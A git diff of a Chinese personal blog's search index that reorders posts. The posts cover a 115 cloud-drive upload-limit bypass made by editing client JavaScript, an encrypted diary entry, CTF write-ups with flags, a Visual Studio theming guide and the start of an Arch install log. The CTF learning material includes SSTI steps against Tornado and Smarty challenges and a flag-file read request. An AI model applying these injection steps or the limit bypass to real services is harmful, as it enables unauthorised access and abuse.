@@ -1,61 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>115上传 浏览器限制解除</title>
-    <url>/2025/12/115%E4%B8%8A%E4%BC%A0-%E6%B5%8F%E8%A7%88%E5%99%A8%E9%99%90%E5%88%B6%E8%A7%A3%E9%99%A4/</url>
-    <content><![CDATA[
-本方法貌似已失效！
-
-由于115网页版对浏览器限制了200MB文件上传大小
-必须要使用115浏览器，这是115美中不足的一点
-下面方法可以绕过
-
-这篇文章是写给115用户的，所以比较详细
-刚才尝试了下油猴脚本，但是根本无法做到，遇到好多玄学bug，其实是根本没做好，小丑了
-
-115网页端切换到新版
-然后搜索“请使用115浏览器上传”
-唯一一个js
-
-找到他的上一行有个e.size &gt; 0xc80000
-把0xc80000改成0x1cc0000000
-然后去网络里面禁用缓存
-
-开着网络界面刷新网页，就能上传超200MB的文件了
-]]></content>
-      <categories>
-        <category>教程</category>
-      </categories>
-      <tags>
-        <tag>115网盘</tag>
-        <tag>JS逆向</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>22年10月末</title>
-    <url>/2022/10/22%E5%B9%B410%E6%9C%88%E6%9C%AB/</url>
-    <content><![CDATA[
-  709e820b2f5bb6db36bae87ed03a646f003cb0ce380f747ce4c88c56db22ab5d4185982fe20a41655de1394a5eceab58e21807493670c6615c8e8242ca46bffad9a1b81b645f9265d7dcb889f7879afeeacd2ac55f245aef6303c7f519362152373411c74c6b8780dce51847d73a6477709fd59641feb9af07d20f42a44b033ed79dda6ed6f98348586cf744d49d850e4ec5bf9d0a470c636f7e9ac709ccf9e657bb4b3f29d6a79cb3c4562fd379c8120eea9e54aa23d4b9e094ebd1a55157e901ea92fd7872064f902faf8f672f3dbacd1f701c31b68649f502bc58470b1a6b7922f3f07b789de6a19dd502fc23db922747aaea4e8fb284696956df74bd0960db72dc071cfd0f0205779edb161c60eaaa57425944d14f7072af8a062cfc2b92de432d8445c8c36840a7a1438d6a3d2a70d9110968062dad2639e0e635f13d5d28e6b4cff03fceeadec9a8e1564efaf0af5a65b4387512bbd60c22ec916331ba00342d42ee062544cee85603083aa857877aa38a967181524503fa7b92737dd05d2d0da46d026e2a5b1ef4fd335eee5e670a7e98b0e184d2e8c9725c4e620f277bcfe3066df4b3d8f7087b0cffe8224850c3c9aec3d8875177d0465d73e85cd6a956060ff4bf7392f6006b8d7d7b0b33edc90946f2154083f626ed9d7d30d08a0dbd5bcbb2f99067dea8fbb30f92f57e000811fa1d38d48037186a333ed8172b16de6987d681d30aab8f7853c8f0b95a4bde4bd686c0b859d0ad0e78159bf91901ee1488d1780f4b3f9f3d82dac504d3073c348dd3962284f8d514333ffb08436e2cb7efcb93009b07f3fcbf66cf8719a62746c61f0cb1c5d195277ab4205a861b3db6a1c8d9700fce7cc50ec271c7db6827e17b1057f24c83c7c5ffbc7c95a1010aae4bb2802640fe4717ea3af66a21f81f36627a788837ba53f8cd83bcaf8e80e6928ad0cd430d68a313e832d8aaa5e6674c40b41f0b1cb6ce2e5ece645eb061abdc24c309f4ac6230b7aa39db0c89923bbd753f1d12a37f50792a3c48f30a6a580c709c896bd8cc9e16924cd49edc2158a8b38aeb494bf4d0e66e2f2c0841802aa7de2477d491576704820400bc2fc47ea148655ad1876fd0aa88f86055f203d8825aef205c18a60a9f1d7e2413998eb31a474bf971173c341e9d4e076a48a0880f2f773ee0180f873dace2986b57d3de518f3bec7f28ee81e31fc8613f0f6a35c25fd1fff05a60969f32d3142ef832ff9644c9cf04aff990e4262d905ffb185e850963e65ebc725c9efda48abeb253493b5475df5851b33f0438c669b8bf10ef97d0c861d7b946cd8b35ab1df4155c39b5bcbe86e4fd6966c95ca3db75a7b384c467baa04c8bde2a762e80b6cc11211cc90e81d1360299ac3a988cc070915d4c6912c136d59b5d32e853240d70b5c08c34b136e1c850eafe44a4fe96dd966a179e1d2e361b2a0c779a9f9cf227ce23ca9534de091c40929182fcbc2b0cf0394313e06be0c4acd1734c2628436a73419ffd99a30f68a7c1f24cd8014432473ead66e2784001336e8fea764ab7a0070e3d1986d7fd5abf3ce43cc48175deb473100726e401061d5fabc0aa8b5ae349a7066e64ef7c28bc9ffd2da128bf1ff39f4ffbaedc68258d99ffcbfa66eaf611984cab584bc356d06f6cd2e1a8e9719f434370d844171a8a5c834e05599c45288f959c06e37fe9b43f6783a93ff955db24aa4e242ded80cbdbfe1ad75b847b319e3fab8f573a132490cd216a0e6b2c556b1b0e5d31c640ab2f1208a969cd4cc6422aa94932f9c19e1f52a9e15fc173a7d3372dd1564634b0e3376a7870935ae38e562a264381fdfac8ea98bc1d5a6beb2dd18de2a871cb94f6cedb999a6c3c12fbf5ebcefab81a5da625732eda863bbb351bbdd570b23f140a04f74c68c841f8920491c60be16542d51d628662db37168f1a2ffa94f5773167923b6bf3de24796e3b7635a05cce38e2f44235a2c5e1ed8bacabfe551532cf6477177d43671df5a40d6ae7e6be8014b7acaa92b2aeae238f73dc44903892ae50c3bef1d34c2ffdcf779d1befe88cb80cf9ce49f2be0661f8ea9dc1c6d488eaeff9fc45a413c4ec96243d57077743db18fa2398504e36718f0d415e9be7d4b21cfd7a603e90bc0bf4f9bb2ab99ea7fa9e67bdf20fff214e4af9a326123b098e8c7450d15936076787b2eba388e5f430cf746b24b87dea17b6a47e8e462d2406baaf7c75245fe9fd12f7a46ef2bd1074113891911471a75a2198a88c57e1f55c975cede4ce6cb870eb1533024f02999076aba9dccdf08bc8d79e82bf9afe76be9a42fba67ce8ed94902c586144d84c490615269ea1c9640cdba11e12702c79b4d42fa1e65774f4ebd82c5809344b3fa94519e3d4428d24928908d8a9c41768ec4bc709bb27794fbbff7cbd998699a5be02f702f5e88dca944daa172c2243d4530ce7b554e900ffcdf70ee175ec3b7992bff07ace4cedb7e03bee505f22934458ee9491b8a8b8ca84802c143c35dfb6166aeb7f0a938be72c95069b8ce00cbb01538496b111e73eb0ad3884d59a6b66bddc3b7d267e9d4214ce37880218d9affa6132b3b787601d1e0fdff635815d8212f0e8dab35d156233319350aa5ef1613f3af7119d70c59431d9e55e67a0a6d892f3c992ad9a08ae101b5b92e23cbed7beb1aa87c7d3222d218aa2ecea1239df9f4990ffccce49c24656d4993ee2adf1ff9824d0509392e26adc1542cac98bbd522ececfa565a4954f20d5f0fe14c67e52ac6d60b9ab932d8b7c728644d9dac02ff1e757b8a1049cfc2e373f33f0d5df08edfd0cda6672cc091d69e73c98e3b91bc33d192a72f9680e5a1bdbedc6db102baac9eca556248c4446e5f48dd51179e0674cb2ba8def64cd3005ac083a17cac549d40cfa98daf16693963cdc7a1a6c58f211d0a47de13b980a9b432d786e124e72079a1a00b33af9f2530008fbf1b17340bb3217cf608ef86973cfb6043681d0b2a842e9fdc5861881d08c37da28250703b4fe7f2f417d7ce3cec7bc23d15f6113beae3e1a449380702181302387014e18d03c545e2f1d17381c417c142b52264639dd54fc3c7ed23047376cffc2a4004476417039e944a2871af69bda97beb9926bb5022d2c1d5866b86d61d54dea7f3b90d623b75beb42c6c9b852b8ddd4eacba8f6822302f484d9c8a2390bb73dc463d97961191f90a7c524776ff64d92c0d5621769991b6fd3efc212093a76973fab2be8336177b42e5608e4dcaa242cff80bd3438157d2dd4c938837922755010fcd5f5d69a0dd3f628fdb5dfb3712991c8c514f319a15c1c25c8bf45944536a111446f9f3eb3ccf6e6d5b4a5f12cad6e49dce8317a21cd6fcd382370c6972a4f730dcc2c93790bbf3fbe9e92f50a5515f1def07455ecf127849e997bf2f2a607949bac3044a7e9d4c62655b193c62911aed1ce192c3b3c1c153e415131ba023dc672bef81e15f6f975f4306ef8e111be0f4ee860fec53c1bbd234bca77f43fbd33ed00dd734c1499d9396b16875f2287a8bd4ae6b2397f9015d7c3881a7e17dcb612565d77df79de5f4958243d966fc6690a82850e0eccd3d8c8192157a36ed683c1382b4d0217c3a8e3f1da9e093ae33a001ea1a531eb382ac283507860ca9ceca6355819dcf9d741e93896cac8b3a9483d8cb611e8c842b0df893777f375720e72d5ffa29fc8e683eb24685b6ac270f4b57a123811b8df1bc161223524325b990482dc48253c07b2b3683a932884b365fd93d48c98a4d17989d16845c38b0f2892f0d37d2be692135f31c6a7227f657e69321403bd6d57a6a5d120ced2ed81a8ee2cf5d110b4eb5fb4b6d555c9151587a937e136703e832a717b2f756ccb7c1f643679ac2e51c47f64f28573ad8c3e971a031454c3cea80e19257797dff1030853b399fd6d7380c55f540f00aaa4f2581900cc469047fd2af511a54d43e75893aa919cb074a2b70a393356efe8c4c5f575f6221c936988519047dd6c9626fdc48d23fbd9548cab00108d5bab2d46e1234202c703227cc89c1525a0d293c62fdc40f8f625d0d21bacdee5e5212195010086a5b154ca9b750a6cdec491d309a05a8591ecef6ceb5e1e0142dfd8b69b84ec62f90dc5fd20d045c1f5b8ec2a076fa890e326c58ffe09dab3eee19c1e7778ab9196e80ac338930b6a7ecb7404bd53ffcead059a856937a6e33a75b40a03f3da0f20af3412650253e4365a082a427352e19b5b3dde8bf28b05e0f446cc660ab17a0fd53a242062f7f267520f5d5182e68dd6c279d6c62406ab36c3f1c40d6c6c2a33ed321b2de85c0fb54eec2c742c089920db6a5f75ffbde89d267802871262336c8a4be1027d2ba2d376be375216c35ca7b530aba016f7fa8dc93291fed5f41b79c8353978c4edcca64156c228caa0a83d9cb50a5e57
-  
-    
-      
-      
-        密码是我的姓名首字母小写
-      
-    
-  
-
-]]></content>
-      <categories>
-        <category>随笔</category>
-      </categories>
-      <tags>
-        <tag>22年10月末</tag>
-        <tag>日记</tag>
-        <tag>随笔</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>网安笔记小结</title>
     <url>/2023/07/---CTF%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93---/</url>
     <content><![CDATA[
@@ -907,56 +852,34 @@ flag get
       </tags>
   </entry>
   <entry>
-    <title>ctfhub-彩蛋</title>
-    <url>/2022/02/CTFHub%E5%BD%A9%E8%9B%8B/</url>
-    <content><![CDATA[工具 彩蛋
-一开始的想法是工具一共有 8 页，想抓个包改下看看有没有第九页
-抓包后发现不管哪一页 limit 都是 12 但 offset 在变化
-于是
-这样设置参数
-在长度为 1000 到 6、7 千左右随便一个双击后 点击响应 看响应包
-在最后一行
-首页 彩蛋
-api中间框内隐藏着两行字
-ctfhub{c18732f48a96c40d40a06e74b1305706}
+    <title>115上传 浏览器限制解除</title>
+    <url>/2025/12/115%E4%B8%8A%E4%BC%A0-%E6%B5%8F%E8%A7%88%E5%99%A8%E9%99%90%E5%88%B6%E8%A7%A3%E9%99%A4/</url>
+    <content><![CDATA[
+本方法貌似已失效！
 
-题目入口 彩蛋
-在 web-ssrf 中间那一列的某些题传参错误时会出现
-详情见ctfhub-ssrfpost 最后一行介绍
-公众号
-公众号彩蛋坑的一批！
-首先要先绑定
-然后点彩蛋
-它提示要回复正确的关键词
-我*#@%
-我回复过
+由于115网页版对浏览器限制了200MB文件上传大小
+必须要使用115浏览器，这是115美中不足的一点
+下面方法可以绕过
 
-彩蛋 关键词 egg ctfhub CTFHub 拿来把你 CTFer 自己人 ……
+这篇文章是写给115用户的，所以比较详细
+刚才尝试了下油猴脚本，但是根本无法做到，遇到好多玄学bug，其实是根本没做好，小丑了
 
-到底没想到竟然是 flag
-投稿提交 彩蛋
-只找到了前半部分
-分别在题目提交和 wp 提交页面的最后
-1234ctfhub{029e02eb3a1
-	e8c49b1132b5
-	15b652a5f3a8
-	62013}
-最后这个彩蛋剩余部分也没找到
-网上搜了下才明白：感谢 anweilx 的wp
-第一行是俩页面的最后有
-第二行是在俩页面源码 分别搜奖励 在上面那行一个是 base64 然后再转 url 一个是 hex 解码
-第三行是俩页面的图片隐写 丢进 winhex
-第四行有提示
-aes 256 ecb解码
-其他彩蛋
-剩余皆可在对应页面搜索 egg 即可获得
+115网页端切换到新版
+然后搜索“请使用115浏览器上传”
+唯一一个js
+
+找到他的上一行有个e.size &gt; 0xc80000
+把0xc80000改成0x1cc0000000
+然后去网络里面禁用缓存
+
+开着网络界面刷新网页，就能上传超200MB的文件了
 ]]></content>
       <categories>
-        <category>web</category>
+        <category>教程</category>
       </categories>
       <tags>
-        <tag>web</tag>
-        <tag>ctfhub</tag>
+        <tag>115网盘</tag>
+        <tag>JS逆向</tag>
       </tags>
   </entry>
   <entry>
@@ -1203,6 +1126,155 @@ echo $response;
       </tags>
   </entry>
   <entry>
+    <title>SSTI模板注入</title>
+    <url>/2022/10/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[
+[护网杯 2018]easy_tornado
+ssti 注入点在 msg
+注入49出现 orz 应该是有过滤
+1正常
+hint 里缺 cookie_secret
+该项在 handler.settings
+
+Handler 这个对象，Handler 指向的处理当前这个页面的 RequestHandler 对象
+RequestHandler 中并没有 settings 这个属性，与 RequestHandler 关联的 Application 对象（Requestion.application）才有 setting 这个属性
+handler 指向 RequestHandler
+而 RequestHandler.settings 又指向 self.application.settings
+所有 handler.settings 就指向 RequestHandler.application.settings 了！
+
+然后按 hint 里的 MD5 加密过后传参
+
+1?filename=/fllllllllllllag&#x26;filehash=ff92d5623223cadc00efabfc7676f9fe
+filehash 不同 请自行加密
+
+[BJDCTF2020]The mystery of ip
+
+1234567891011121314151617181920212223242526272829303132333435&#x3C;?php
+	require_once('header.php');
+	require_once('./libs/Smarty.class.php');
+	$smarty = new Smarty();
+	if (!empty($_SERVER['HTTP_CLIENT_IP']))
+	{
+		   $ip=$_SERVER['HTTP_CLIENT_IP'];
+	}
+	elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
+	{
+	    $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
+	}
+	else
+	{
+	    $ip=$_SERVER['REMOTE_ADDR'];
+	}
+	//$your_ip = $smarty->display("string:".$ip);
+	echo "&#x3C;div class=\"container panel1\">
+				&#x3C;div class=\"row\">
+				&#x3C;div class=\"col-md-4\">
+				&#x3C;/div>
+				&#x3C;div class=\"col-md-4\">
+				&#x3C;div class=\"jumbotron pan\">
+					&#x3C;div class=\"form-group log\">
+						&#x3C;label>&#x3C;h2>Your IP is : ";
+	$smarty->display("string:".$ip);
+	echo "				&#x3C;/h2>&#x3C;/label>
+					&#x3C;/div>
+				&#x3C;/div>
+				&#x3C;/div>
+				&#x3C;div class=\"col-md-4\">
+				&#x3C;/div>
+				&#x3C;/div>
+			&#x3C;/div>";
+	?>
+
+[BJDCTF2020]Cookie is so stable
+
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>SSTI</tag>
+        <tag>模板注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>22年10月末</title>
+    <url>/2022/10/22%E5%B9%B410%E6%9C%88%E6%9C%AB/</url>
+    <content><![CDATA[
+  709e820b2f5bb6db36bae87ed03a646f003cb0ce380f747ce4c88c56db22ab5d4185982fe20a41655de1394a5eceab58e21807493670c6615c8e8242ca46bffad9a1b81b645f9265d7dcb889f7879afeeacd2ac55f245aef6303c7f519362152373411c74c6b8780dce51847d73a6477709fd59641feb9af07d20f42a44b033ed79dda6ed6f98348586cf744d49d850e4ec5bf9d0a470c636f7e9ac709ccf9e657bb4b3f29d6a79cb3c4562fd379c8120eea9e54aa23d4b9e094ebd1a55157e901ea92fd7872064f902faf8f672f3dbacd1f701c31b68649f502bc58470b1a6b7922f3f07b789de6a19dd502fc23db922747aaea4e8fb284696956df74bd0960db72dc071cfd0f0205779edb161c60eaaa57425944d14f7072af8a062cfc2b92de432d8445c8c36840a7a1438d6a3d2a70d9110968062dad2639e0e635f13d5d28e6b4cff03fceeadec9a8e1564efaf0af5a65b4387512bbd60c22ec916331ba00342d42ee062544cee85603083aa857877aa38a967181524503fa7b92737dd05d2d0da46d026e2a5b1ef4fd335eee5e670a7e98b0e184d2e8c9725c4e620f277bcfe3066df4b3d8f7087b0cffe8224850c3c9aec3d8875177d0465d73e85cd6a956060ff4bf7392f6006b8d7d7b0b33edc90946f2154083f626ed9d7d30d08a0dbd5bcbb2f99067dea8fbb30f92f57e000811fa1d38d48037186a333ed8172b16de6987d681d30aab8f7853c8f0b95a4bde4bd686c0b859d0ad0e78159bf91901ee1488d1780f4b3f9f3d82dac504d3073c348dd3962284f8d514333ffb08436e2cb7efcb93009b07f3fcbf66cf8719a62746c61f0cb1c5d195277ab4205a861b3db6a1c8d9700fce7cc50ec271c7db6827e17b1057f24c83c7c5ffbc7c95a1010aae4bb2802640fe4717ea3af66a21f81f36627a788837ba53f8cd83bcaf8e80e6928ad0cd430d68a313e832d8aaa5e6674c40b41f0b1cb6ce2e5ece645eb061abdc24c309f4ac6230b7aa39db0c89923bbd753f1d12a37f50792a3c48f30a6a580c709c896bd8cc9e16924cd49edc2158a8b38aeb494bf4d0e66e2f2c0841802aa7de2477d491576704820400bc2fc47ea148655ad1876fd0aa88f86055f203d8825aef205c18a60a9f1d7e2413998eb31a474bf971173c341e9d4e076a48a0880f2f773ee0180f873dace2986b57d3de518f3bec7f28ee81e31fc8613f0f6a35c25fd1fff05a60969f32d3142ef832ff9644c9cf04aff990e4262d905ffb185e850963e65ebc725c9efda48abeb253493b5475df5851b33f0438c669b8bf10ef97d0c861d7b946cd8b35ab1df4155c39b5bcbe86e4fd6966c95ca3db75a7b384c467baa04c8bde2a762e80b6cc11211cc90e81d1360299ac3a988cc070915d4c6912c136d59b5d32e853240d70b5c08c34b136e1c850eafe44a4fe96dd966a179e1d2e361b2a0c779a9f9cf227ce23ca9534de091c40929182fcbc2b0cf0394313e06be0c4acd1734c2628436a73419ffd99a30f68a7c1f24cd8014432473ead66e2784001336e8fea764ab7a0070e3d1986d7fd5abf3ce43cc48175deb473100726e401061d5fabc0aa8b5ae349a7066e64ef7c28bc9ffd2da128bf1ff39f4ffbaedc68258d99ffcbfa66eaf611984cab584bc356d06f6cd2e1a8e9719f434370d844171a8a5c834e05599c45288f959c06e37fe9b43f6783a93ff955db24aa4e242ded80cbdbfe1ad75b847b319e3fab8f573a132490cd216a0e6b2c556b1b0e5d31c640ab2f1208a969cd4cc6422aa94932f9c19e1f52a9e15fc173a7d3372dd1564634b0e3376a7870935ae38e562a264381fdfac8ea98bc1d5a6beb2dd18de2a871cb94f6cedb999a6c3c12fbf5ebcefab81a5da625732eda863bbb351bbdd570b23f140a04f74c68c841f8920491c60be16542d51d628662db37168f1a2ffa94f5773167923b6bf3de24796e3b7635a05cce38e2f44235a2c5e1ed8bacabfe551532cf6477177d43671df5a40d6ae7e6be8014b7acaa92b2aeae238f73dc44903892ae50c3bef1d34c2ffdcf779d1befe88cb80cf9ce49f2be0661f8ea9dc1c6d488eaeff9fc45a413c4ec96243d57077743db18fa2398504e36718f0d415e9be7d4b21cfd7a603e90bc0bf4f9bb2ab99ea7fa9e67bdf20fff214e4af9a326123b098e8c7450d15936076787b2eba388e5f430cf746b24b87dea17b6a47e8e462d2406baaf7c75245fe9fd12f7a46ef2bd1074113891911471a75a2198a88c57e1f55c975cede4ce6cb870eb1533024f02999076aba9dccdf08bc8d79e82bf9afe76be9a42fba67ce8ed94902c586144d84c490615269ea1c9640cdba11e12702c79b4d42fa1e65774f4ebd82c5809344b3fa94519e3d4428d24928908d8a9c41768ec4bc709bb27794fbbff7cbd998699a5be02f702f5e88dca944daa172c2243d4530ce7b554e900ffcdf70ee175ec3b7992bff07ace4cedb7e03bee505f22934458ee9491b8a8b8ca84802c143c35dfb6166aeb7f0a938be72c95069b8ce00cbb01538496b111e73eb0ad3884d59a6b66bddc3b7d267e9d4214ce37880218d9affa6132b3b787601d1e0fdff635815d8212f0e8dab35d156233319350aa5ef1613f3af7119d70c59431d9e55e67a0a6d892f3c992ad9a08ae101b5b92e23cbed7beb1aa87c7d3222d218aa2ecea1239df9f4990ffccce49c24656d4993ee2adf1ff9824d0509392e26adc1542cac98bbd522ececfa565a4954f20d5f0fe14c67e52ac6d60b9ab932d8b7c728644d9dac02ff1e757b8a1049cfc2e373f33f0d5df08edfd0cda6672cc091d69e73c98e3b91bc33d192a72f9680e5a1bdbedc6db102baac9eca556248c4446e5f48dd51179e0674cb2ba8def64cd3005ac083a17cac549d40cfa98daf16693963cdc7a1a6c58f211d0a47de13b980a9b432d786e124e72079a1a00b33af9f2530008fbf1b17340bb3217cf608ef86973cfb6043681d0b2a842e9fdc5861881d08c37da28250703b4fe7f2f417d7ce3cec7bc23d15f6113beae3e1a449380702181302387014e18d03c545e2f1d17381c417c142b52264639dd54fc3c7ed23047376cffc2a4004476417039e944a2871af69bda97beb9926bb5022d2c1d5866b86d61d54dea7f3b90d623b75beb42c6c9b852b8ddd4eacba8f6822302f484d9c8a2390bb73dc463d97961191f90a7c524776ff64d92c0d5621769991b6fd3efc212093a76973fab2be8336177b42e5608e4dcaa242cff80bd3438157d2dd4c938837922755010fcd5f5d69a0dd3f628fdb5dfb3712991c8c514f319a15c1c25c8bf45944536a111446f9f3eb3ccf6e6d5b4a5f12cad6e49dce8317a21cd6fcd382370c6972a4f730dcc2c93790bbf3fbe9e92f50a5515f1def07455ecf127849e997bf2f2a607949bac3044a7e9d4c62655b193c62911aed1ce192c3b3c1c153e415131ba023dc672bef81e15f6f975f4306ef8e111be0f4ee860fec53c1bbd234bca77f43fbd33ed00dd734c1499d9396b16875f2287a8bd4ae6b2397f9015d7c3881a7e17dcb612565d77df79de5f4958243d966fc6690a82850e0eccd3d8c8192157a36ed683c1382b4d0217c3a8e3f1da9e093ae33a001ea1a531eb382ac283507860ca9ceca6355819dcf9d741e93896cac8b3a9483d8cb611e8c842b0df893777f375720e72d5ffa29fc8e683eb24685b6ac270f4b57a123811b8df1bc161223524325b990482dc48253c07b2b3683a932884b365fd93d48c98a4d17989d16845c38b0f2892f0d37d2be692135f31c6a7227f657e69321403bd6d57a6a5d120ced2ed81a8ee2cf5d110b4eb5fb4b6d555c9151587a937e136703e832a717b2f756ccb7c1f643679ac2e51c47f64f28573ad8c3e971a031454c3cea80e19257797dff1030853b399fd6d7380c55f540f00aaa4f2581900cc469047fd2af511a54d43e75893aa919cb074a2b70a393356efe8c4c5f575f6221c936988519047dd6c9626fdc48d23fbd9548cab00108d5bab2d46e1234202c703227cc89c1525a0d293c62fdc40f8f625d0d21bacdee5e5212195010086a5b154ca9b750a6cdec491d309a05a8591ecef6ceb5e1e0142dfd8b69b84ec62f90dc5fd20d045c1f5b8ec2a076fa890e326c58ffe09dab3eee19c1e7778ab9196e80ac338930b6a7ecb7404bd53ffcead059a856937a6e33a75b40a03f3da0f20af3412650253e4365a082a427352e19b5b3dde8bf28b05e0f446cc660ab17a0fd53a242062f7f267520f5d5182e68dd6c279d6c62406ab36c3f1c40d6c6c2a33ed321b2de85c0fb54eec2c742c089920db6a5f75ffbde89d267802871262336c8a4be1027d2ba2d376be375216c35ca7b530aba016f7fa8dc93291fed5f41b79c8353978c4edcca64156c228caa0a83d9cb50a5e57
+  
+    
+      
+      
+        密码是我的姓名首字母小写
+      
+    
+  
+
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+      <tags>
+        <tag>22年10月末</tag>
+        <tag>日记</tag>
+        <tag>随笔</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctfhub-彩蛋</title>
+    <url>/2022/02/CTFHub%E5%BD%A9%E8%9B%8B/</url>
+    <content><![CDATA[工具 彩蛋
+一开始的想法是工具一共有 8 页，想抓个包改下看看有没有第九页
+抓包后发现不管哪一页 limit 都是 12 但 offset 在变化
+于是
+这样设置参数
+在长度为 1000 到 6、7 千左右随便一个双击后 点击响应 看响应包
+在最后一行
+首页 彩蛋
+api中间框内隐藏着两行字
+ctfhub{c18732f48a96c40d40a06e74b1305706}
+
+题目入口 彩蛋
+在 web-ssrf 中间那一列的某些题传参错误时会出现
+详情见ctfhub-ssrfpost 最后一行介绍
+公众号
+公众号彩蛋坑的一批！
+首先要先绑定
+然后点彩蛋
+它提示要回复正确的关键词
+我*#@%
+我回复过
+
+彩蛋 关键词 egg ctfhub CTFHub 拿来把你 CTFer 自己人 ……
+
+到底没想到竟然是 flag
+投稿提交 彩蛋
+只找到了前半部分
+分别在题目提交和 wp 提交页面的最后
+1234ctfhub{029e02eb3a1
+	e8c49b1132b5
+	15b652a5f3a8
+	62013}
+最后这个彩蛋剩余部分也没找到
+网上搜了下才明白：感谢 anweilx 的wp
+第一行是俩页面的最后有
+第二行是在俩页面源码 分别搜奖励 在上面那行一个是 base64 然后再转 url 一个是 hex 解码
+第三行是俩页面的图片隐写 丢进 winhex
+第四行有提示
+aes 256 ecb解码
+其他彩蛋
+剩余皆可在对应页面搜索 egg 即可获得
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>ctfhub</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>UofTCTF复现</title>
     <url>/2025/11/UofTCTF%E5%A4%8D%E7%8E%B0wp/</url>
     <content><![CDATA[web
@@ -1442,75 +1514,31 @@ pyjail-学习总结【CV】 | TWe1v3
       </tags>
   </entry>
   <entry>
-    <title>SSTI模板注入</title>
-    <url>/2022/10/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
+    <title>Visual Studio 2022界面美化教程</title>
+    <url>/2021/12/Visual%20Studio%202022%E7%95%8C%E9%9D%A2%E7%BE%8E%E5%8C%96%E6%95%99%E7%A8%8B/</url>
     <content><![CDATA[
-[护网杯 2018]easy_tornado
-ssti 注入点在 msg
-注入49出现 orz 应该是有过滤
-1正常
-hint 里缺 cookie_secret
-该项在 handler.settings
+我之前用的是 2019 版本，后来有出新版我也没管，直到前几天他给我推送 2022 版了，查了下大部分都是好评（bug 恐惧症和恋旧），于是我决定入 2022 版了，但又怕我在 2019 调好的设置用不到 2022 上，于是暂时让两个版本共存，等 2022 调试好了再说 2019 的事。
+这是我在 2019 上美化用到的插件和设置（因为网上类似的不少，但 2022 版貌似没有人发过，所以我决定写这篇文章）
+不出所料，2022 版好多东西更新，导致一些东西不能用了，导入 2019 版甚至文件的时候，有一部分报错了，要不然就是改名了，要不然就是更新换代了，没大有影响，以萌新目前来看，是往好的方向发展了。
+但是我的那些美化插件直接搜名字的话是找不到了，于是我就在那找替代品，就找到了这两个插件。
+第一个插件，是 2019 版变的，变了样之后差点给我整不会了，它是类似于编程。
+新建项目 C#里面最后一项
 
-Handler 这个对象，Handler 指向的处理当前这个页面的 RequestHandler 对象
-RequestHandler 中并没有 settings 这个属性，与 RequestHandler 关联的 Application 对象（Requestion.application）才有 setting 这个属性
-handler 指向 RequestHandler
-而 RequestHandler.settings 又指向 self.application.settings
-所有 handler.settings 就指向 RequestHandler.application.settings 了！
 
-然后按 hint 里的 MD5 加密过后传参
+创建之后，把 2019 版的该插件里的美化设置导出，然后重命名为 CustomTheme.vstheme
+然后复制到你新创建的 2022 版那个项目里，选择替换更新，之后项目文件夹里.sln 后缀的那个文件打开，选择你之前那个配置的名字，然后运行，不管他蹦出来啥弹窗，等他一打开接着关了就好，之后重启 visualstudio 就可以了
 
-1?filename=/fllllllllllllag&#x26;filehash=ff92d5623223cadc00efabfc7676f9fe
-filehash 不同 请自行加密
+这个插件是为后面设置背景图片准备
+第二个插件我原来用的是 moeIDE，但是 2022 版它不支持了，所以就用新插件代替了。
 
-[BJDCTF2020]The mystery of ip
-
-1234567891011121314151617181920212223242526272829303132333435&#x3C;?php
-	require_once('header.php');
-	require_once('./libs/Smarty.class.php');
-	$smarty = new Smarty();
-	if (!empty($_SERVER['HTTP_CLIENT_IP']))
-	{
-		   $ip=$_SERVER['HTTP_CLIENT_IP'];
-	}
-	elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
-	{
-	    $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
-	}
-	else
-	{
-	    $ip=$_SERVER['REMOTE_ADDR'];
-	}
-	//$your_ip = $smarty->display("string:".$ip);
-	echo "&#x3C;div class=\"container panel1\">
-				&#x3C;div class=\"row\">
-				&#x3C;div class=\"col-md-4\">
-				&#x3C;/div>
-				&#x3C;div class=\"col-md-4\">
-				&#x3C;div class=\"jumbotron pan\">
-					&#x3C;div class=\"form-group log\">
-						&#x3C;label>&#x3C;h2>Your IP is : ";
-	$smarty->display("string:".$ip);
-	echo "				&#x3C;/h2>&#x3C;/label>
-					&#x3C;/div>
-				&#x3C;/div>
-				&#x3C;/div>
-				&#x3C;div class=\"col-md-4\">
-				&#x3C;/div>
-				&#x3C;/div>
-			&#x3C;/div>";
-	?>
-
-[BJDCTF2020]Cookie is so stable
+背景图是 B 站 1024 节发布的一张壁纸，我用 ps 调了下对比度，让他更鲜艳一些
 
 ]]></content>
       <categories>
-        <category>web</category>
+        <category>教程</category>
       </categories>
       <tags>
-        <tag>web</tag>
-        <tag>SSTI</tag>
-        <tag>模板注入</tag>
+        <tag>visual studio 2022</tag>
       </tags>
   </entry>
   <entry>
@@ -1605,145 +1633,6 @@ proc/net/arp
         <tag>web</tag>
         <tag>xxe</tag>
         <tag>buuctf</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>arch + niri + noctalia-shell安装记录</title>
-    <url>/2026/01/arch/</url>
-    <content><![CDATA[
-本文只是记录非教程，教程见下方参考文献
-
-仅以此文悼念出生未满一周便被安乐的Arch娘
-起因
-跟了我四年多的笔记本512G硬盘又双叒叕爆红了，又到了例行重装系统的时候了
-但是这一次我直接选择买一块硬盘，虽然是这价格涨到天际的时候，一块1T PCIE3gen4
-别问为什么是pcie3 因为是老电脑 1TB是因为没钱 请各位鸽鸽们打赏点吧
-于是打算干脆装个arch + niri + noctalia-shell
-反正网上说适配得不错了，一些软件的wayland水土不服也都有教程了
